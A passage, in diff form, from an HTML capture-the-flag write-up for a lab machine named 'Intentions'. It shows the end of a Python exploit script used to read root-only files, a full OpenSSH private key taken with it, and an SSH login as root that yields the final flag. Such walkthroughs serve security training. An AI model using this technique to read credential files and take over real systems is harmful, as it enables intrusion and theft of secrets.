+    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Quitting...</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+The usage is quite straightforward; we just need to specify the file we want to open:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span><span class="w">  </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="mi">0</span><span class="n">f5c7d8a90bfcf13a0327946f240fe34</span>
+
+
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">File</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">output</span><span class="p">.</span><span class="n">txt</span>
+
+<span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+The content of the file is displayed on the screen and is also saved in the current directory in a file named <code>output.txt</code>.<br/><br/>
+Previously, we read the file <code>/root/root.txt</code>, Now, we will attempt to gain access to the system using the root user's SSH private key:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span>
+<span class="o">-----</span><span class="k">BEGIN</span><span class="w"> </span><span class="n">OPENSSH</span><span class="w"> </span><span class="n">PRIVATE</span><span class="w"> </span><span class="k">KEY</span><span class="o">-----</span>
+<span class="n">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="n">NhAAAAAwEAAQAAAYEA5yMuiPaWPr6P0GYiUi5EnqD8QOM9B7gm2lTHwlA7FMw95</span><span class="o">/</span><span class="n">wy8JW3</span>
+<span class="n">HqEMYrWSNpX2HqbvxnhOBCW</span><span class="o">/</span><span class="n">uwKMbFb4LPI</span><span class="o">+</span><span class="n">EzR6eHr5vG438EoeGmLFBvhge54WkTvQyd</span>
+<span class="n">vk6xqxjypi3PivKnI2Gm</span><span class="o">+</span><span class="n">BWzcMi6kHI</span><span class="o">+</span><span class="n">NLDUVn7aNthBIg9OyIVwp7LXl3cgUrWM4StvYZ</span>
+<span class="n">ZyGpITFR</span><span class="o">/</span><span class="mi">1</span><span class="n">KjaCQjLDnshZO7OrM</span><span class="o">/</span><span class="n">PLWdyipq2yZtNoB57kvzbPRpXu7ANbM8wV3cyk</span><span class="o">/</span><span class="n">OZt</span>
+<span class="mi">0</span><span class="n">LZdhfMuJsJsFLhZufADwPVRK1B0oMjcnljhUuVvYJtm8Ig</span><span class="o">/</span><span class="mi">8</span><span class="n">fC9ZEcycF69E</span><span class="o">+</span><span class="n">nBAiDuUm</span>
+<span class="n">kDAhdj0ilD63EbLof4rQmBuYUQPy</span><span class="o">/</span><span class="n">KMUwGujCUBQKw3bXdOMs</span><span class="o">/</span><span class="n">jq6n8bK7ERcHIEx6uTdw</span>
+<span class="n">gE6WlJQhgAp6hT7CiINq34Z2CFd9t2x1o24</span><span class="o">+</span><span class="n">JOAQj9JCubRa1fOMFs8OqEBiGQHmOIjmUj</span>
+<span class="mi">7</span><span class="n">x17Ygwfhs4O8AQDvjhizWop</span><span class="o">/</span><span class="mi">7</span><span class="n">Njg7Xm7ouxzoXdAAAFiJKKGvOSihrzAAAAB3NzaC1yc2</span>
+<span class="n">EAAAGBAOcjLoj2lj6</span><span class="o">+</span><span class="n">j9BmIlIuRJ6g</span><span class="o">/</span><span class="n">EDjPQe4JtpUx8JQOxTMPef8MvCVtx6hDGK1kjaV</span>
+<span class="mi">9</span><span class="n">h6m78Z4TgQlv7sCjGxW</span><span class="o">+</span><span class="n">CzyPhM0enh6</span><span class="o">+</span><span class="n">bxuN</span><span class="o">/</span><span class="n">BKHhpixQb4YHueFpE70Mnb5OsasY8qYt</span>
+<span class="n">z4rypyNhpvgVs3DIupByPjSw1FZ</span><span class="o">+</span><span class="mi">2</span><span class="n">jbYQSIPTsiFcKey15d3IFK1jOErb2GWchqSExUf9S</span>
+<span class="n">o2gkIyw57IWTuzqzPzy1ncoqatsmbTaAee5L82z0aV7uwDWzPMFd3MpPzmbdC2XYXzLibC</span>
+<span class="n">bBS4WbnwA8D1UStQdKDI3J5Y4VLlb2CbZvCIP</span><span class="o">/</span><span class="n">HwvWRHMnBevRPpwQIg7lJpAwIXY9IpQ</span><span class="o">+</span>
+<span class="n">txGy6H</span><span class="o">+</span><span class="n">K0JgbmFED8vyjFMBrowlAUCsN213TjLP46up</span><span class="o">/</span><span class="n">GyuxEXByBMerk3cIBOlpSUIYAK</span>
+<span class="n">eoU</span><span class="o">+</span><span class="n">woiDat</span><span class="o">+</span><span class="n">GdghXfbdsdaNuPiTgEI</span><span class="o">/</span><span class="n">SQrm0WtXzjBbPDqhAYhkB5jiI5lI</span><span class="o">+</span><span class="mi">8</span><span class="n">de2IMH4bO</span>
+<span class="n">DvAEA744Ys1qKf</span><span class="o">+</span><span class="n">zY4O15u6Lsc6F3QAAAAMBAAEAAAGABGD0S8gMhE97LUn3pC7RtUXPky</span>
+<span class="n">tRSuqx1VWHu9yyvdWS5g8iToOVLQ</span><span class="o">/</span><span class="n">RsP</span><span class="o">+</span><span class="n">hFga</span><span class="o">+</span><span class="n">jqNmRZBRlz6foWHIByTMcOeKH8</span><span class="o">/</span><span class="n">qjD4O</span>
+<span class="mi">9</span><span class="n">wM8ho4U5pzD5q2nM3hR4G1g0Q4o8EyrzygQ27OCkZwi</span><span class="o">/</span><span class="n">idQhnz</span><span class="o">/</span><span class="mi">8</span><span class="n">EsvtWRj</span><span class="o">/</span><span class="n">D8G6ME9lo</span>
+<span class="n">pHlKdz4fg</span><span class="o">/</span><span class="n">tj0UmcGgA4yF3YopSyM5XCv3xac</span><span class="o">+</span><span class="n">YFjwHKSgegHyNe3se9BlMJqfz</span><span class="o">+</span><span class="n">gfgTz3</span>
+<span class="mi">8</span><span class="n">l9LrLiVoKS6JsCvEDe6HGSvyyG9eCg1mQ6J9EkaN2q0uKN35T5siVinK9FtvkNGbCEzFC</span>
+<span class="n">PknyAdy792vSIuJrmdKhvRTEUwvntZGXrKtwnf81SX</span><span class="o">/</span><span class="n">ZMDRJYqgCQyf5vnUtjKznvohz2R</span>
+<span class="mi">0</span><span class="n">i4lakvtXQYC</span><span class="o">/</span><span class="n">NNc1QccjTL2NID4nSOhLH2wYzZhKku1vlRmK13HP5BRS0Jus8ScVaYaIS</span>
+<span class="n">bEDknHVWHFWndkuQSG2EX9a2auy7oTVCSu7bUXFnottatOxo1atrasNOWcaNkRgdehAAAA</span>
+<span class="n">wQDUQfNZuVgdYWS0iJYoyXUNSJAmzFBGxAv3EpKMliTlb</span><span class="o">/</span><span class="n">LJlKSCTTttuN7NLHpNWpn92S</span>
+<span class="n">pNDghhIYENKoOUUXBgb26gtg1qwzZQGsYy8JLLwgA7g4RF3VD2lGCT377lMD9xv3bhYHPl</span>
+<span class="n">lo0L7jaj6PiWKD8Aw0StANo4vOv9bS6cjEUyTl8QM05zTiaFk</span><span class="o">/</span><span class="n">UoG3LxoIDT6Vi8wY7hIB</span>
+<span class="n">AhDZ6Tm44Mf</span><span class="o">+</span><span class="n">XRnBM7AmZqsYh8nw</span><span class="o">++</span><span class="n">rhFdr9d39pYaFgok9DcAAADBAO1D0v0</span><span class="o">/</span><span class="mi">2</span><span class="n">a2XO4DT</span>
+<span class="n">AZdPSERYVIF2W5TH1Atdr37g7i7zrWZxltO5rrAt6DJ79W2laZ9B1Kus1EiXNYkVUZIarx</span>
+<span class="n">Yc6Mr5lQ1CSpl0a</span><span class="o">+</span><span class="n">OwyJK3Rnh5VZmJQvK0sicM9MyFWGfy7cXCKEFZuinhS4DPBCRSpNBa</span>
+<span class="n">zv25Fap0Whav4yqU7BsG2S</span><span class="o">/</span><span class="n">mokLGkQ9MVyFpbnrVcnNrwDLd2</span><span class="o">/</span><span class="n">whZoENYsiKQSWIFlx8Gd</span>
+<span class="n">uCNB7UAUZ7mYFdcDBAJ6uQvPFDdphWPQAAAMEA</span><span class="o">+</span><span class="n">WN</span><span class="o">+</span><span class="n">VN</span><span class="o">/</span><span class="n">TVcfYSYCFiSezNN2xAXCBkkQZ</span>
+<span class="n">X7kpdtTupr</span><span class="o">+</span><span class="n">gYhL6gv</span><span class="o">/</span><span class="n">A5mCOSvv1BLgEl0A05BeWiv7FOkNX5BMR94</span><span class="o">/</span><span class="n">NWOlS1Z3T0p</span><span class="o">+</span><span class="n">mbj</span>
+<span class="n">D7F0nauYkSG</span><span class="o">+</span><span class="n">eLwFAd9K</span><span class="o">/</span><span class="n">kcdxTuUlwvmPvQiNg70Z142bt1tKN8b3WbttB3sGq39jder8p</span>
+<span class="n">nhPKs4TzMzb0gvZGGVZyjqX68coFz3k1nAb5hRS5Q</span><span class="o">+</span><span class="n">P6y</span><span class="o">/</span><span class="n">XxmdBB4TEHqSQtQ4PoqDj2IP</span>
+<span class="n">DVJTokldQ0d4ghAAAAD3Jvb3RAaW50ZW50aW9ucwECAw</span><span class="o">==</span>
+<span class="o">-----</span><span class="k">END</span><span class="w"> </span><span class="n">OPENSSH</span><span class="w"> </span><span class="n">PRIVATE</span><span class="w"> </span><span class="k">KEY</span><span class="o">-----</span>
+
+
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">File</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">output</span><span class="p">.</span><span class="n">txt</span>
+
+<span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Now we can copy this key to our machine and adjust its permissions:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="mi">600</span><span class="w"> </span><span class="n">id_rsa</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Finally, we have successfully gained access as the root user via SSH:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">ssh</span><span class="w"> </span><span class="n">root</span><span class="mf">@10.10.11.220</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">id_rsa</span>
+<span class="n">Welcome</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mf">22.04.2</span><span class="w"> </span><span class="n">LTS</span><span class="w"> </span><span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="mf">5.15.0</span><span class="mi">-76</span><span class="o">-</span><span class="n">generic</span><span class="w"> </span><span class="n">x86_64</span><span class="p">)</span>
+
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Documentation</span><span class="o">:</span><span class="w">  </span><span class="n">https</span><span class="o">:</span><span class="c1">//help.ubuntu.com</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Management</span><span class="o">:</span><span class="w">     </span><span class="n">https</span><span class="o">:</span><span class="c1">//landscape.canonical.com</span>
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Support</span><span class="o">:</span><span class="w">        </span><span class="n">https</span><span class="o">:</span><span class="c1">//ubuntu.com/advantage</span>
+
+<span class="w">  </span><span class="n">System</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Oct</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mo">05</span><span class="o">:</span><span class="mi">25</span><span class="o">:</span><span class="mo">06</span><span class="w"> </span><span class="n">PM</span><span class="w"> </span><span class="n">UTC</span><span class="w"> </span><span class="mi">2023</span>
+
+<span class="w">  </span><span class="n">System</span><span class="w"> </span><span class="n">load</span><span class="o">:</span><span class="w">           </span><span class="mf">0.0556640625</span>
+<span class="w">  </span><span class="n">Usage</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="o">/:</span><span class="w">            </span><span class="mf">58.8</span><span class="o">%</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="mf">6.30</span><span class="n">GB</span>
+<span class="w">  </span><span class="n">Memory</span><span class="w"> </span><span class="n">usage</span><span class="o">:</span><span class="w">          </span><span class="mi">8</span><span class="o">%</span>
+<span class="w">  </span><span class="n">Swap</span><span class="w"> </span><span class="n">usage</span><span class="o">:</span><span class="w">            </span><span class="mi">0</span><span class="o">%</span>
+<span class="w">  </span><span class="nl">Processes</span><span class="p">:</span><span class="w">             </span><span class="mi">228</span>
+<span class="w">  </span><span class="n">Users</span><span class="w"> </span><span class="n">logged</span><span class="w"> </span><span class="k">in</span><span class="o">:</span><span class="w">       </span><span class="mi">1</span>
+<span class="w">  </span><span class="n">IPv4</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">eth0</span><span class="o">:</span><span class="w"> </span><span class="mf">10.10.11.220</span>
+<span class="w">  </span><span class="n">IPv6</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">eth0</span><span class="o">:</span><span class="w"> </span><span class="n">dead</span><span class="o">:</span><span class="n">beef</span><span class="o">::</span><span class="mi">250</span><span class="o">:</span><span class="mf">56f</span><span class="n">f</span><span class="o">:</span><span class="n">feb9</span><span class="o">:</span><span class="mi">8816</span>
+
+<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Strictly</span><span class="w"> </span><span class="n">confined</span><span class="w"> </span><span class="n">Kubernetes</span><span class="w"> </span><span class="n">makes</span><span class="w"> </span><span class="n">edge</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">IoT</span><span class="w"> </span><span class="n">secure</span><span class="p">.</span><span class="w"> </span><span class="n">Learn</span><span class="w"> </span><span class="n">how</span><span class="w"> </span><span class="n">MicroK8s</span>
+<span class="w">   </span><span class="n">just</span><span class="w"> </span><span class="n">raised</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">bar</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">easy</span><span class="p">,</span><span class="w"> </span><span class="n">resilient</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">secure</span><span class="w"> </span><span class="n">K8s</span><span class="w"> </span><span class="n">cluster</span><span class="w"> </span><span class="n">deployment</span><span class="p">.</span>
+
+<span class="w">   </span><span class="nl">https</span><span class="p">:</span><span class="c1">//ubuntu.com/engage/secure-kubernetes-at-the-edge</span>
+
+<span class="n">Expanded</span><span class="w"> </span><span class="n">Security</span><span class="w"> </span><span class="n">Maintenance</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">Applications</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">enabled</span><span class="p">.</span>
+
+<span class="mi">0</span><span class="w"> </span><span class="n">updates</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">applied</span><span class="w"> </span><span class="n">immediately</span><span class="p">.</span>
+
+<span class="mi">12</span><span class="w"> </span><span class="n">additional</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">updates</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">applied</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">ESM</span><span class="w"> </span><span class="n">Apps</span><span class="p">.</span>
+<span class="n">Learn</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">about</span><span class="w"> </span><span class="n">enabling</span><span class="w"> </span><span class="n">ESM</span><span class="w"> </span><span class="n">Apps</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">https</span><span class="o">:</span><span class="c1">//ubuntu.com/esm</span>
+
+
+<span class="n">The</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">available</span><span class="w"> </span><span class="n">updates</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">than</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">week</span><span class="w"> </span><span class="n">old</span><span class="p">.</span>
+<span class="n">To</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">updates</span><span class="w"> </span><span class="n">run</span><span class="o">:</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">apt</span><span class="w"> </span><span class="n">update</span>
+<span class="n">Failed</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">https</span><span class="o">:</span><span class="c1">//changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span>
+
+
+<span class="n">Last</span><span class="w"> </span><span class="n">login</span><span class="o">:</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Oct</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">16</span><span class="o">:</span><span class="mi">48</span><span class="o">:</span><span class="mi">21</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="mf">10.10.16.6</span>
+<span class="n">root</span><span class="p">@</span><span class="n">intentions</span><span class="o">:~</span><span class="err">#</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Now, we can read the final flag:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">root</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">whoami</span>
+<span class="n">root</span>
+<span class="n">root</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">id</span><span class="w"> </span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+<span class="n">root</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="mi">0</span><span class="n">f5c7</span><span class="o">***********************</span><span class="n">fe34</span>
+<span class="n">root</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div></br></br></br></br></br></br></br></br></br></br>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2023 elswix.github.io</p>
+    </footer>
+</body>
+</html>
